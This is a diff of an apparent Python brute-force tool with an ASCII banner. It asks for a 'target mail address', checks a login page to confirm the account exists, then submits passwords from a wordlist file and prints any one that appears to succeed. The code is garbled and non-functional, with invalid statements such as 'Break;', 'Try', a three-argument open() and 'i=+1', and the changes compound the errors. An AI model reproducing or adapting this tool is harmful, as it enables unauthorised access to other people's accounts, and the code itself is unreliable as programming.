@@ -44,6 +44,7 @@ while answer:
         print('\033[1;36m \______  / /_______  / |____|    |_______ \|___|\____|__  /  |____|   /_______  / |____|_  / \033[1;36m')
         print('\033[1;36m        \/          \/                    \/             \/                    \/         \/  \033[1;00m')
 
+
         Break;
         mail = input("Enter target mail address:")
 
@@ -68,10 +69,10 @@ while answer:
 
         web.form['Email or phone'] = mail
 
-        response = web.submit()
-        response_data = response.r()
+        responses = web.submit()
+        responses_data = responses.r()
 
-        if "Enter your password" in response_data:
+        if "Enter your password" in responses_data:
            print("MAIL ADDRESS FOUND🦉")
         else: 
            print('\033[1;31mMAIL ADDRESS NOT FOUND\033[1;00m') 
@@ -81,21 +82,20 @@ while answer:
         i=0
         while file:
                 file=open('pass.txt','o','r')
-                password=file.readline().strip()
-        i=+1
-        if len(password) < 11:
-           continue
-        print=str(i) + " : ",password
+                i=+1
+                if len(file) < 11:
+                       continue
+                print(" Trying ",file+"")
     
 
         Try
         web.select_form(nr=0)
 
-        web.form['Enter your password']= password
-        response = web.submit()
-        response_data = response.r()
-        'Add a home address' in response_data or 'Add or confirm your recovery mail or phone number' in response_data;
-        print("your password is: ",password)
+        web.form['Enter your password']= file
+        responses = web.submit()
+        responses_data = responses.r()
+        'Add a home address' in responses_data or 'Add or confirm your recovery mail or phone number' in responses_data;
+        print("your password is: ",file)
         sys.exit()
 
     elif answer=="2":
